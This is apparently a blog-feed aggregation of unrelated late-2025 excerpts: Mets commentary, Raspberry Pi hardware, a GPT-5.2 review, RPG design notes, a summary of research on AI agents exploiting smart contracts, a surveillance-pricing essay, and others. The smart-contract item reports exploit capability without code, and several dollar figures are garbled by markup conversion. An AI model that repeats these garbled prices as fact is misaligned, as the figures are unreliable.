<p>A team isn't a bunch of stats and a bunch of money, it's the players, the people. You can't solve this problem with a spreadsheet, it has to be done with heart. These days I think of the Mets just trying to be the Yankees which aside from being impossible, is pretty much the exact reason we're Mets fans and not Yankees fans. Ohhh, when will they learn. I don't want a team built to win the World Series. I want a team built to respect the team.</p>
<p>And btw, the big news was they traded Nimmo, and let Alonso and Diaz sign with other teams.</p>

I'm not being funny or sarcastic, I mean it. They already had a mechanism for deciding who matters. And the software they used could have been employed by all the other pubs, and anyone else. What I'm describing is the alternate reality where the Twitter founders followed the WordPress model. They might not be worth billions, but they certainly would have <a href="http://scripting.com/davenet/2000/10/19/transcendentalMoney.html">far more money</a> than one person can use.

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/raspberry-pi-cm0.jpeg" alt="Raspberry Pi CM0"></p>
<p>This little postage stamp is actually a full Raspberry Pi Zero 2, complete with eMMC storage and WiFi.</p>
<p>But you can't get one. Well, not unless you buy the <a href="https://edatec.cn/docs/cm0nano/ds/">CM0NANO development board from EDAtec</a>, or you live in China.</p>
<p>This little guy doesn't have an HDMI port, Ethernet, or even USB. It's a special version of the 'Compute Module' line of boards. Little Raspberry Pi 'System on Modules' (SoMs), they're called.</p>
<p>Compute Modules are entire Linux computers about the size of a regular desktop CPU that you 'plug in' to another board, to give it life.</p>

      <p>Without much of a spoiler, this end of this week's Pluribus was both emotional and exciting at the same time. Didn't see it coming. People complain because after the first two or three episodes they thought it was going to be an adventure, like <a href="https://en.wikipedia.org/wiki/The_Last_of_Us_(TV_series)">Last of Us</a> or <a href="https://en.wikipedia.org/wiki/Lost_(TV_series)">Lost</a>, but it turned out to, at least for now, be more thoughtful and emotional, and sexy.</p>

      <p>I wonder if the VCs would fund an entirely fictitious implementation of Twitter with AI of course. All the other people are AI designed actors, and can be exactly the kind of people who make <em>you</em> feel good. On &quot;Your Own Twitter&quot; you'd have the most followers of anyone. Elon Musk would kiss your ass. You could change reality at will, have Trump removed from office and watch the MAGAs wail in pain. You could say absolutely whatever you like and never be cancelled. Don't laugh, I bet this happens.</p>

(date: 2025-12-12)
      <p>
      <p>The promise of personal AI assistants rests on a dangerous assumption: that we can trust systems we haven’t made trustworthy. We can’t. And today’s versions are failing us in predictable ways: pushing us to do things against our own best interests, gaslighting us with doubt about things we are or that we know, and being unable to distinguish between who we are and who we have been. They struggle with incomplete, inaccurate, and partial context: with no standard way to move toward accuracy, no mechanism to correct sources of error, and no accountability when wrong information leads to bad decisions...</p>

      <h1>GPT-5.2</h1>

(date: 2025-12-11)
      <p>
      <p>OpenAI reportedly <a href="https://www.wsj.com/tech/ai/openais-altman-declares-code-red-to-improve-chatgpt-as-google-threatens-ai-lead-7faf5ea6">declared a &quot;code red&quot;</a> on the 1st of December in response to increasingly credible competition from the likes of Google's Gemini 3. It's less than two weeks later and they just <a href="https://openai.com/index/introducing-gpt-5-2/">announced GPT-5.2</a>, calling it &quot;the most capable model series yet for professional knowledge work&quot;.</p>
<h4>Key characteristics of GPT-5.2</h4>
<p>The new model comes in two variants: GPT-5.2 and GPT-5.2 Pro. There's no Mini variant yet.</p>
<p>GPT-5.2 is available via their UI in both &quot;instant&quot; and &quot;thinking&quot; modes, presumably still corresponding to the API concept of different reasoning effort levels.</p>
<p>The knowledge cut-off date for both variants is now <strong>August 31st 2025</strong>. This is significant - GPT 5.1 and 5 were both Sep 30, 2024 and GPT-5 mini was May 31, 2024.</p>
<p>Both of the 5.2 models have a 400,000 token context window and 128,000 max output tokens - no different from 5.1 or 5.</p>
<p>Pricing wise 5.2 is a rare <em>increase</em> - it's 1.4x the cost of GPT 5.1, at <span class="math inline">\(1.75/million input and \)</span>14/million output. GPT-5.2 Pro is <span class="math inline">\(21.00/million input and a hefty \)</span>168.00/million output, putting it <a href="https://www.llm-prices.com/#sel=gpt-4.5%2Co1-pro%2Cgpt-5.2-pro">up there</a> with their previous most expensive models o1 Pro and GPT-4.5.</p>
<p>So far the main benchmark results we have are self-reported by OpenAI. The most interesting ones are a 70.9% score on their GDPval &quot;Knowledge work tasks&quot; benchmark (GPT-5 got 38.8%) and a 52.9% on ARC-AGI-2 (up from 17.6% for GPT-5.1 Thinking).</p>
<p>The ARC Prize Twitter account provided <a href="https://x.com/arcprize/status/1999182732845547795">this interesting note</a> on the efficiency gains for GPT-5.2 Pro</p>
<blockquote>
<p>A year ago, we verified a preview of an unreleased version of @OpenAI
o3 (High) that scored 88% on ARC-AGI-1 at est. $4.5k/task</p>
<p>Today, we’ve verified a new GPT-5.2 Pro (X-High) SOTA score of 90.5% at $11.64/task</p>
<p>This represents a ~390X efficiency improvement in one year</p>
</blockquote>
<p>GPT-5.2 can be accessed in OpenAI's Codex CLI tool like this:</p>
<pre><code>codex -m gpt-5.2

</code></pre>
<p>There are three new API models:</p>
<ul>
<li><a href="https://platform.openai.com/docs/models/gpt-5.2">gpt-5.2</a> - I think this is what you get if you select &quot;GPT-5.2 Thinking&quot; in ChatGPT but <a href="https://twitter.com/simonw/status/1999603339382976785">I'm a little confused</a>.</li>
<li><a href="https://platform.openai.com/docs/models/gpt-5.2-chat-latest">gpt-5.2-chat-latest</a> - the model used by ChatGPT for &quot;GPT-5.2 Instant&quot; mode. It's priced the same as GPT-5.2 but has a reduced 128,000 context window with 16,384 max output tokens.</li>
<li><a href="https://platform.openai.com/docs/models/gpt-5.2-pro">gpt-5.2-pro</a></li>
</ul>
<p>OpenAI have published a new <a href="https://cookbook.openai.com/examples/gpt-5/gpt-5-2_prompting_guide">GPT-5.2 Prompting Guide</a>. An interesting note from that document is that compaction can now be run with <a href="https://platform.openai.com/docs/api-reference/responses/compact">a new dedicated server-side API</a>:</p>
<blockquote>
<p>For long-running, tool-heavy workflows that exceed the standard context window, GPT-5.2 with Reasoning supports response compaction via the <code>/responses/compact</code> endpoint. Compaction performs a loss-aware compression pass over prior conversation state, returning encrypted, opaque items that preserve task-relevant information while dramatically reducing token footprint. This allows the model to continue reasoning across extended workflows without hitting context limits.</p>
</blockquote>
<h4>It's better at vision</h4>
<p>One note from the announcement that caught my eye:</p>
<blockquote>
<p>GPT‑5.2 Thinking is our strongest vision model yet, cutting error rates roughly in half on chart reasoning and software interface understanding.</p>
</blockquote>
<p>I had <a href="https://simonwillison.net/2025/Aug/29/the-perils-of-vibe-coding/">disappointing results from GPT-5</a> on an OCR task a while ago. I tried it against GPT-5.2 and it did <em>much</em> better:</p>
<pre><code>llm -m gpt-5.2 ocr -a https://static.simonwillison.net/static/2025/ft.jpeg
</code></pre>
<p>Here's <a href="https://gist.github.com/simonw/b4a13f1e424e58b8b0aca72ae2c3cb00">the result</a> from that, which cost 1,520 input and 1,022 for a total of <a href="https://www.llm-prices.com/#it=1520&amp;ot=1022&amp;sel=gpt-5.2">1.6968 cents</a>.</p>
<h4>Rendering some pelicans</h4>
<p>For my classic &quot;Generate an SVG of a pelican riding a bicycle&quot; test:</p>
<pre><code>llm -m gpt-5.2 &quot;Generate an SVG of a pelican riding a bicycle&quot;
</code></pre>
<p><img src="https://static.simonwillison.net/static/2025/gpt-2.5-pelican.png" alt="Described by GPT-5.2: Cartoon-style illustration: A white, duck-like bird with a small black eye, oversized orange beak (with a pale blue highlight along the lower edge), and a pink neckerchief rides a blue-framed bicycle in side view; the bike has two large black wheels with gray spokes, a blue front fork, visible black crank/pedal area, and thin black handlebar lines, with gray motion streaks and a soft gray shadow under the bike on a light-gray road; background is a pale blue sky with a simple yellow sun at upper left and two rounded white clouds (one near upper center-left and one near upper right)."></p>
<p>And for the more advanced alternative test, which tests instruction following in a little more depth:</p>
<pre><code>llm -m gpt-5.2 &quot;Generate an SVG of a California brown pelican riding a bicycle. The bicycle
must have spokes and a correctly shaped bicycle frame. The pelican must have its
characteristic large pouch, and there should be a clear indication of feathers.
The pelican must be clearly pedaling the bicycle. The image should show the full
breeding plumage of the California brown pelican.&quot;
</code></pre>
<p><img src="https://static.simonwillison.net/static/2025/gpt-5.2-p2.png" alt="Digital illustration on a light gray/white background with a thin horizontal baseline: a stylized California brown pelican in breeding plumage is drawn side-on, leaning forward and pedaling a bicycle; the pelican has a dark brown body with layered wing lines, a pale cream head with a darker brown cap and neck shading, a small black eye, and an oversized long golden-yellow bill extending far past the front wheel; one brown leg reaches down to a pedal while the other is tucked back; the bike is shown in profile with two large spoked wheels (black tires, white rims), a dark frame, crank and chainring near the rear wheel, a black saddle above the rear, and the front fork aligned under the pelican’s head; text at the top reads &quot;California brown pelican (breeding plumage) pedaling a bicycle&quot;."></p>
<p><strong>Update 14th December 2025</strong>: I used GPT-5.2 running in Codex CLI to <a href="https://simonwillison.net/2025/Dec/15/porting-justhtml/">port a complex Python library to JavaScript</a>. It ran without interference for nearly four hours and completed a complex task exactly to my specification.</p>

<p>Now that <a href="https://www.jeffgeerling.com/blog/2025/nvidia-graphics-cards-work-on-pi-5-and-rockchip">Nvidia GPUs run on the Raspberry Pi</a>, I've been putting all the ones I own through their paces.</p>
<p>Many people have an older Nvidia card (like a 3060) laying around from an upgrade. So could a Pi be suitable for GPU-accelerated video transcoding, either standalone for conversion, or running something like Jellyfin for video library management and streaming?</p>
<p>That's what I set out to do, and the first step, besides getting the drivers and CUDA going (see blog post linked above), was to find a way to get a repeatable benchmark going.</p>

      <h1>2025-12-11 Status in Kinetic Energy</h1>

(date: 2025-12-11)
      <p>
      <h1>2025-12-11 Status in Kinetic Energy</h1>
<p>I think I need to write something about how I want to use Status. My <a href="Kinetic_Energy">Kinetic Energy</a> game has it, just like Traveller. And I also have the empire, and techno feudalism. I want to emphasise the terrible feudal aspects of this and encourage the game to be about the struggle against it. In this context, Status is your standing and social capital within the empire. How many friends in high places you have, how much favours you can call in, like the Resources test in Burning Wheel. Now, if you are exposed as a rebel, you can still pull strings but some things must necessarily change. And clearly, if you leave the empire completely, then your Status there drops to the minimum (1): You have become a stranger, a refugee. Or we could say: There is a new Status attribute for every hegemony. The default is simply: Your status within the empire.</p>
<p>I think this matches what I wrote <a href="2025-11-25-first-session">a few days ago</a>:</p>
<blockquote>
<p>Status 7 is what I would consider an honest citizen of the empire. The axis is important. Outside the empire, your status would immediately drop and it would take a lifetime to get back up. … Status-10 is close to nobility. So who is close to nobility? People useful to the empire. People working in their administration, close to the court; friends of young nobles who were talented but sadly lacked the right connections. There is that class ceiling. No matter how hard you try: you can get a good job but you can never stop working.</p>
</blockquote>
<p>Treating Status as your family connections and your network of influence is also why it also doesn’t make sense to “increase” your Status as you level up. I guess if you marry into the imperial family, one could say that increases your status. Or perhaps your status stays the same. After all, your partner married a provincial nobody! But your children might have a better status. Now that would be a cool Pendragon-Traveller cross-over.</p>
<p>That reminds me of a line in <a href="Knives">Knives</a> where I have a section called <em>The Next Generation</em>:</p>
<blockquote>
<p>When creating characters that are children of other characters, do not roll for Education or Status. Instead, children inherit Education and Status from their parents …</p>
</blockquote>
<p>In Knives, I said “up to a maximum of 7” but for Kinetic Energy I think what should happen is you “usually” get the education of your parents (sadly true in Switzerland), let’s do a kind of “flux” roll: your parent’s Education +1d6 -1d6. And maybe the average of your parent’s Status, rounded up?</p>

      <h1>AIs Exploiting Smart Contracts</h1>

(date: 2025-12-11)
      <p>
      <p>I have long maintained that smart contracts are a dumb idea: that a human process is actually a security feature.</p>
<p>Here’s some <a href="https://red.anthropic.com/2025/smart-contracts/">interesting research</a> on training AIs to automatically exploit smart contracts:</p>
<blockquote>
<p>AI models are increasingly good at cyber tasks, as we’ve <a href="https://red.anthropic.com/2025/ai-for-cyber-defenders/">written about before</a>. But what is the economic impact of these capabilities? In a recent <a href="https://www.matsprogram.org/">MATS</a> and Anthropic Fellows project, our scholars investigated this question by evaluating AI agents’ ability to exploit smart contracts on <a href="https://github.com/safety-research/SmartContract-bench">Smart CONtracts Exploitation benchmark (SCONE-bench)</a> ­a new benchmark they built comprising 405 contracts that were actually exploited between 2020 and 2025. On contracts exploited after the latest knowledge cutoffs (June 2025 for Opus 4.5 and March 2025 for other models), Claude Opus 4.5, Claude Sonnet 4.5, and GPT-5 developed exploits collectively worth <span class="math inline">\(4.6 million, establishing a concrete lower bound for the economic harm these capabilities could enable. Going beyond retrospective analysis, we evaluated both Sonnet 4.5 and GPT-5 in simulation against 2,849 recently deployed contracts without any known vulnerabilities. Both agents uncovered two novel zero-day vulnerabilities and produced exploits worth \)</span>3,694, with GPT-5 doing so at an API cost of $3,476. This demonstrates as a proof-of-concept that profitable, real-world autonomous exploitation is technically feasible, a finding that underscores the need for proactive adoption of AI for defense...</p>

      <h1>Pluralistic: Instacart reaches into your pocket and lops a third off your dollars (11 Dec 2025)</h1>

(date: 2025-12-11)
      <p>
      <p>Today's links Instacart reaches into your pocket and lops a third off your dollars: A/B splitting your way into doing a total fucking racism. Hey look at this: Delights to delectate. Object permanence: Predicting the present; Caller eye-deer; RIP Robert Sheckley; Student protesters and Google Maps vs kettling; If your kids like computers, they're criminals; A billion CC licenses; The moral character of cryptographic work; EC resurrects link-taxes. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. Instacart reaches into your pocket and lops a third off your dollars (permalink) There's a whole greedflation-denial cottage industry that insists that rising prices are either the result of unknowable, untameable and mysterious economic forces, or they're the result of workers having too much money and too many jobs. The one thing we're absolutely not allowed to talk about is the fact that CEOs keep going on earnings calls to announce that they are hiking prices way ahead of any increase in their costs, and blaming inflation: <a href="https://pluralistic.net/2021/11/20/quiet-part-out-loud/#profiteering">https://pluralistic.net/2021/11/20/quiet-part-out-loud/#profiteering</a> Nor are we supposed to notice the &quot;price consultancies&quot; that let the dominant firms in many sectors – from potatoes to meat to rental housing – fix prices in illegal collusive arrangements that are figleafed by the tissue-thin excuse that &quot;if you use an app to fix prices, it's not a crime&quot;: <a href="https://pluralistic.net/2025/01/25/potatotrac/#carbo-loading">https://pluralistic.net/2025/01/25/potatotrac/#carbo-loading</a> And we're especially not supposed to notice the proliferation of &quot;personalized pricing&quot; businesses that use surveillance data to figure out how desperate you are and charge you a premium based on that desperation: <a href="https://pluralistic.net/2024/06/05/your-price-named/#privacy-first-again">https://pluralistic.net/2024/06/05/your-price-named/#privacy-first-again</a> Surveillance pricing – when you are charged more for the same goods than someone else, based on surveillance data about the urgency of your need and the cash in your bank account – is a way for companies to reach into your pocket and devalue the dollars in your wallet. After all, if you pay <span class="math inline">\(2 for something that I pay \)</span>1 for, that's just the company saying that your dollars are only worth half as much as mine: <a href="https://pluralistic.net/2025/06/24/price-discrimination/">https://pluralistic.net/2025/06/24/price-discrimination/</a> It's a form of cod-Marxism: &quot;from each according to their desperation&quot;: <a href="https://pluralistic.net/2025/01/11/socialism-for-the-wealthy/#rugged-individualism-for-the-poor">https://pluralistic.net/2025/01/11/socialism-for-the-wealthy/#rugged-individualism-for-the-poor</a> The economy is riddled with surveillance pricing gouging. You are almost certainly paying more than your neighbors for various items, based on algorithmic price-setting, every day. Case in point: More Perfect Union and Groundwork Collaborative teamed up with Consumer Reports to recruit 437 volunteers from across America to log in to Instacart at the same time and buy the same items from 15 stores, and found evidence of surveillance pricing at Albertsons, Costco, Kroger, and Sprouts Farmers Market: <a href="https://groundworkcollaborative.org/work/instacart/">https://groundworkcollaborative.org/work/instacart/</a> The price-swings are wild. Some test subjects are being charged 23% more than others. The average variance for &quot;the exact same items, from the exact same locations, at the exact same time&quot; comes out to 7%, or &quot;<span class="math inline">\(1,200 per year for groceries" for a family of four. The process by which your greedflation premium is assigned is opaque. The researchers found that Instacart shoppers ordering from Target clustered into seven groups, but it's not clear how Instacart decides how much extra to charge any given shopper. Instacart – who acquired Eversight, a surveillance pricing company, in 2022 – blamed the merchants (who, in turn, blamed Instacart). Instacart also claimed that they didn't use surveillance data to price goods, but hedged, admitting that the consumer packaged goods duopoly of Unilever and Procter & Gamble do use surveillance data in connection with their pricing strategies. Finally, Instacart claimed that this was all an "experiment" to "learn what matters most to consumers and how to keep essential items affordable." In other words, they were secretly charging you more (for things like eggs and bread) because somehow that lets them "keep essential items affordable." Instacart said their goal was to help "retail partners understand consumer preferences and identify categories where they should invest in lower prices." Anyone who's done online analytics can easily pierce this obfuscation, but for those of you who haven't had the misfortune of directing an iterated, A/B tested optimization effort, I'll unpack this statement. Say you have a pool of users and a bunch of variations on a headline. You randomly assign different variants to different users and measure clickthroughs. Then you check to see which variants performed best, and dig into the data you have on those users to see if there are any correlations that tie together users who liked a given approach. This might let you discover that, say, women over 40 click more often on headlines that mention kittens. Then you generate more variations based on these conclusions – different ways of mentioning kittens – and see which of these variations perform best, and whether the targeted group of users split into smaller subgroups (women over 40 in the midwest prefer "tabby kitten" while their southern sisters prefer "kitten" without a mention of breed). By repeatedly iterating over these steps, you can come up with many highly refined variants, and you can use surveillance data to target them to ever narrower, more optimized slices of your user-base. Obviously, this is very labor intensive. You have to do a lot of tedious analysis, and generate a lot of variants. This is one of the reasons that slopvertising is so exciting to the worst people on earth: they imagine that they can use AI to create a self-licking ice-cream cone, performing the analysis and generating endless new variations, all untouched by human hands. But when it comes to prices, it's much easier to produce variants – all you're doing is adding or subtracting from the price you show to shoppers. You don't need to get the writing team together to come up with new ways of mentioning kittens in a headline – you can just raise the price from \)</span>6.23 to <span class="math inline">\(6.45 and see if midwestern women over 40 balk or add the item to their shopping baskets. And here's the kicker: you don't need to select by gender, racial or economic criteria to end up with a super-racist and exploitative arrangement. That's because race, gender and socioeconomic status have broad correlates that are easily discoverable through automated means. For example, thanks to generations of redlining, discriminatory housing policy, wage discrimination and environmental racism, the poorest, sickest neighborhoods in the country are also the most racialized and are also most likely to be "food deserts" where you can't just go to the grocery store and shop for your family. What's more, the private equity-backed dollar store duopoly have waged a decades-long war on community grocery stores, enveloping them with dollar stores that use their access to preferential discounts (from companies like Unilever and Procter & Gamble, another duopoly) to force grocers out of business: https://pluralistic.net/2023/03/27/walmarts-jackals/#cheater-sizes Then these dollar stores run a greedflation scam that is so primitive, it's almost laughable: they just charge customers much higher amounts than the prices shown on the shelves and price-tags: https://www.consumeraffairs.com/news/do-all-those-low-dollar-store-prices-really-add-up-120325.html When you live in a food desert where your only store is a Dollar General that defrauds you at the cash-register, you are more likely to accept a higher price from Instacart, because you have fewer choices than someone in a middle-class neighborhood with two or three competing grocers. And the people who live in those food deserts are more likely to be poor, which, in America, is an excellent predictor of whether they are Black or brown. Which is to say, without ever saying "Charge Black people more for groceries," Instacart can easily A/B split its way into a system where they predictably and reliably charge Black people more for groceries. That's the old cod-Marxism at work: "from each according to their desperation." This is so well-understood that anyone who sets one of these systems in motion should be understood to be deliberately seeking to do racist profiteering under cover of an algorithm. It's empiricism-washing: "I'm not racist, I just did some math" (that produced a predictably racist outcome): https://www.reuters.com/article/world/insight-amazon-scraps-secret-ai-recruiting-tool-that-showed-bias-against-women-idUSKCN1MK0AG/ This is the dark side and true meaning of "business optimization." The optimal business pays its suppliers and workers nothing, and charges its customers everything it can. Obviously, businesses need to settle for suboptimal outcomes, because workers won't show up if they don't get paid, and customers won't buy things that cost everything they have⹋. ⹋ Unless, of course, you are an academic publisher, in which case this is just how you do business. A business "optimizes" its workforce by finding ways to get them to accept lower wages. For example, they can bind their workers with noncompete "agreements" that ban Wendy's cashiers from quitting their job and making \)</span>0.25 more per hour at the McDonald's next door (one in 18 American workers have been locked into one of these contracts): <a href="https://pluralistic.net/2025/09/09/germanium-valley/#i-cant-quit-you">https://pluralistic.net/2025/09/09/germanium-valley/#i-cant-quit-you</a> Or they can lock their workers in with &quot;training repayment agreement provisions&quot; (TRAPs) – contractual clauses that force workers to pay their bosses thousands of dollars if they quit or get fired: <a href="https://pluralistic.net/2022/08/04/its-a-trap/#a-little-on-the-nose">https://pluralistic.net/2022/08/04/its-a-trap/#a-little-on-the-nose</a> But the most insidious form of worker optimization is &quot;algorithmic wage discrimination.&quot; That's when a company uses surveillance data to lower the wages of workers. For example, contract nurses are paid less if the app that hires them discovers (through the unregulated data-broker sector) that they have a lot of credit-card debt. After all, nurses who are heavily indebted can't afford to be choosy and turn down lowball offers: <a href="https://pluralistic.net/2024/12/18/loose-flapping-ends/#luigi-has-a-point">https://pluralistic.net/2024/12/18/loose-flapping-ends/#luigi-has-a-point</a> This is the other form of surveillance pricing: pricing labor based on surveillance data. It's more cod-Marxism: &quot;From each according to their desperation.&quot; Forget &quot;becoming ungovernable&quot;: to defeat these evil fuckers, we have to become unoptimizable: <a href="https://pluralistic.net/2025/08/20/billionaireism/#surveillance-infantalism">https://pluralistic.net/2025/08/20/billionaireism/#surveillance-infantalism</a> How do we do that? Well, nearly every form of &quot;optimization&quot; begins with surveillance. They can't figure out whether they can charge you more if they can't spy on you. They can't figure out whether they can pay you less if they can't spy on you, either. And the reason they can spy on you is because we let them. The last consumer privacy law to pass out of Congress was a 1988 bill that bans video-store clerks from disclosing your VHS rental history. Every other form of consumer surveillance is permitted under US federal law. So step one of this process is to ban commercial surveillance. Banning algorithmic price discrimination is all well and good, but it is, ultimately, a form of redistribution. We're trying to make the companies share some of the excess they extract from our surveillance data. But predistribution – ending surveillance itself, in this case – is always far more effective than redistribution: <a href="https://pluralistic.net/2025/10/31/losing-the-crypto-wars/#surveillance-monopolism">https://pluralistic.net/2025/10/31/losing-the-crypto-wars/#surveillance-monopolism</a> How do we do that? Well, we need to build a coalition. At the Electronic Frontier Foundation, we call this &quot;privacy first&quot;: you can't solve all the internet's problems by fixing privacy, but you won't fix most of them unless we get privacy right, and so the (potential) coalition for a strong privacy regime is large and powerful: <a href="https://pluralistic.net/2023/12/06/privacy-first/#but-not-just-privacy">https://pluralistic.net/2023/12/06/privacy-first/#but-not-just-privacy</a> But of course, &quot;privacy first,&quot; doesn't mean &quot;just privacy.&quot; We also need tools that target algorithmic pricing per se. In New York State, there's a new law that requires disclosure of algorithmic pricing, in the form of a prominent notification reading, &quot;THIS PRICE WAS SET BY AN ALGORITHM USING YOUR PERSONAL DATA.&quot; This is extremely weaksauce, and might even be worse than nothing. In California we have Prop 65, a rule that requires businesses to post signs and add labels any time they expose you to chemicals &quot;known to the state of California to cause cancer.&quot; This caveat emptor approach (warn people, let them vote with their wallets) has led to every corner of California's built environment being festooned with these warnings. Today, Californians just ignore these warnings, the same way that web users ignore the &quot;privacy policy&quot; disclosures on the sites they visit: <a href="https://pluralistic.net/2025/04/19/gotcha/#known-to-the-state-of-california-to-cause-cancer">https://pluralistic.net/2025/04/19/gotcha/#known-to-the-state-of-california-to-cause-cancer</a> The right approach isn't to (merely) warn people about carcinogens (or privacy risks). The right approach is regulating harmful business practices, whether those practices give you a tumor or pick your pocket. Under Biden, former FTC chair Lina Khan undertook proceedings to ban algorithmic pricing altogether. Trump's FTC killed that, along with all the other quality-of-life enhancing measures the FTC had in train (Trump's FTC chair replaced these with a program to root out &quot;wokeness&quot; in the agency). Today, Khan is co-chair of Zohran Mamdani's transition team, and she will use the mayor's authority (under the New York City Consumer Protection Law of 1969, which addresses &quot;unconscionable&quot; commercial practices) to ban algorithmic pricing in NYC: <a href="https://pluralistic.net/2025/11/15/unconscionability/#standalone-authority">https://pluralistic.net/2025/11/15/unconscionability/#standalone-authority</a> Khan wasn't Biden's only de-optimizer. Under chair Rohit Chopra, Biden's Consumer Finance Protection Bureau actually banned the data-brokers who power surveillance pricing: <a href="https://pluralistic.net/2023/08/16/the-second-best-time-is-now/#the-point-of-a-system-is-what-it-does">https://pluralistic.net/2023/08/16/the-second-best-time-is-now/#the-point-of-a-system-is-what-it-does</a> And of course, Trump's CFPB (neutered by Musk and his broccoli-haired brownshirts at DOGE) killed that effort: <a href="https://pluralistic.net/2025/05/15/asshole-to-appetite/#ssn-for-sale">https://pluralistic.net/2025/05/15/asshole-to-appetite/#ssn-for-sale</a> But the CFPB staffer who ran that effort has gone to work on an effort to leverage a New Jersey state privacy law to crush the data-broker industry: <a href="https://www.wired.com/story/daniels-law-new-jersey-online-privacy-matt-adkisson-atlas-lawsuits/">https://www.wired.com/story/daniels-law-new-jersey-online-privacy-matt-adkisson-atlas-lawsuits/</a> These are efforts to optimize corporations for human thriving, by making them charge us less and pay us more. For while we are best off when we are unoptimizable, we are also best off when corporations are totally optimized – for our benefit.

      <h1>A Newsletter of Humorous Writing #422</h1>

(date: 2025-12-11)
      <p>
      <h3><em>For December 3-9, 2025</em></h3>
<p>Hello and welcome to <strong>A Newsletter of Humorous Writing</strong>, a roundup of the week's finest short humor pieces and funny articles, and a celebration of the fantastic writers who wrote them. <strong>Thanks so much to everyone who came out to the Hangout of Humorous Readings last night!</strong> It was a blast getting to see and catch up with so many of you and we hope you had a good time as well. And if you weren’t able to make it, hope to see you at the next one in 2026!</p>

<h2>What We Enjoyed This Week</h2>
<p><a href="https://www.mcsweeneys.net/articles/casting-notice-for-the-unaired-cw-pilot-young-hamlet?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-422"><strong>Casting Notice for the Unaired CW Pilot Young Hamlet</strong></a> <strong>by</strong> <a href="https://www.mcsweeneys.net/authors/scarlet-meyer?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-422"><strong>Scarlet Meyer</strong></a> <em>(McSweeney’s)</em> The casting notice form is a really fun vehicle for some great jokes about the conventions and clichés of teen dramas. And though this piece is about all the ways CW-style shows can go wrong, we couldn’t help but feel that this hypothetical take on Hamlet would also kinda rock. Scarlet, start working on that pilot (or send it to us if you’ve already written one)!</p>
<p><a href="https://www.pointsincase.com/articles/how-i-built-22-streams-of-passive-income-by-blackmailing-the-starting-lineup-of-the-philadelphia-eagles?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-422"><strong>How I Built 22 Streams of Passive Income by Blackmailing the Starting Lineup of the Philadelphia Eagles</strong></a> <strong>by</strong> <a href="https://www.pointsincase.com/author/ally-mason?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-422"><strong>Ally Mason</strong></a> <em>(Points in Case)</em> There are so many great wacky specifics in this piece, starting with the choice to have the targets of the blackmail be the starting lineup of the Philadelphia Eagles. We’re particularly fond of: “Offensive tackle Jordan Mailata thought no one would ever find out about his secret cover band, Kn*Sync, a surreal collision of NSYNC's chart-topping hits with avant-garde electronica act ‘The Knife.’ Now I not only get hush money, but also a cut of the door, merch, and all CD sales.”</p>

      <h1>Skip intro</h1>

(date: 2025-12-11)
      <p>
      <p>There’s the old adage “nobody gets fired for buying IBM”. Or to put it more broadly, “everyone else is doing it.”</p>
<p>It’s dispiriting how often this explanation is given as justification for a dubious design decision, from home-page carousels to cookie banners.</p>
<p>Nic Chan has written <a href="https://www.nicchan.me/blog/the-f-off-contact-page/">a great post about designing a contact form</a> and how the process was derailed by the client pointing to other people’s contact forms …even when they’ve got very, very different user needs.</p>
<p>It’s especially depressing when “everyone else is doing it” is used a substitute for any kind of accountability.</p>
<p>Building an email service that’s going to track when people click on links in an email? That sounds dodgy. On the other hand, everyone else is doing it.</p>
<p>Building a straightforward website, but making it a single-page app with client-side React that will be barely work on some devices and networks? That seems over-engineered. On the other hand, everyone else is doing it.</p>
<p>Sometimes the “everyone else is doing it” phenomenon leads to a chain reaction where nobody even knows why anyone ever did it in the first place.</p>
<p>Remember Flash? Remember when almost every website had a Flash intro? Everyone knew they were annoying and uneccessary, but everyone else was doing it.</p>
<p>Instead of getting rid of the intros, we got “skip intro” links instead. This link was guaranteed to have a 100% clickthrough rate.</p>
<p>I’ve noticed something similar with conference talks. So many of them begin with a little spiel about the speaker, their background, and their work experience.</p>
<p>This might be interesting information, but this isn’t the right time or place for it. It’s already on the conference website, in the conference programme, and has probably just been reiterated by the conference host who just introduced the speaker.</p>
<p>When I’ve asked why people do this, the responses generally come down to “everyone else is doing it.” It’s become an expected part of the conference talk, just like a Flash intro used to be an expected part of a website.</p>
<p>When I’m curating a conference, I like to send speakers some information to help them prepare their talk. Some of this is practical stuff, like the tech set-up. Some of it is guidance for the slides, like ensuring sufficient colour contrast. And then there’s this:</p>
<blockquote>
<p>Please don’t begin your talk with an introduction about yourself and your work history. You’ll be introduced on stage so it would be a shame to just repeat all that again. Also, it just gets in the way of the actual content of your talk. No need to provide your bona-fides.</p>
</blockquote>
<p>Personally, I just find it super cringe. That’s why I don’t do it if I’m giving a talk myself.</p>
<p>As a host however, it’s a big part of my job. It’s way less cringe to have someone else big you up before the talk then doing it yourself.</p>

      <h1>Useful patterns for building HTML tools</h1>

(date: 2025-12-10)
      <p>
      <p>I've started using the term <strong>HTML tools</strong> to refer to HTML applications that I've been building which combine HTML, JavaScript, and CSS in a single file and use them to provide useful functionality. I have built <a href="https://tools.simonwillison.net/">over 150 of these</a> in the past two years, almost all of them written by LLMs. This article presents a collection of useful patterns I've discovered along the way.</p>
<p>First, some examples to show the kind of thing I'm talking about:</p>
<ul>

<p>These are some of my recent favorites. I have dozens more like this that I use on a regular basis.</p>
<p>You can explore my collection on <strong><a href="https://tools.simonwillison.net/">tools.simonwillison.net</a></strong> - the <a href="https://tools.simonwillison.net/by-month">by month</a> view is useful for browsing the entire collection.</p>
<p>If you want to see the code and prompts, almost all of the examples in this post include a link in their footer to &quot;view source&quot; on GitHub. The GitHub commits usually contain either the prompt itself or a link to the transcript used to create the tool.</p>

<h4>The anatomy of an HTML tool</h4>
<p>These are the characteristics I have found to be most productive in building tools of this nature:</p>
<ol>
<li>A single file: inline JavaScript and CSS in a single HTML file means the least hassle in hosting or distributing them, and crucially means you can copy and paste them out of an LLM response.</li>
<li>Avoid React, or anything with a build step. The problem with React is that JSX requires a build step, which makes everything massively less convenient. I prompt &quot;no react&quot; and skip that whole rabbit hole entirely.</li>
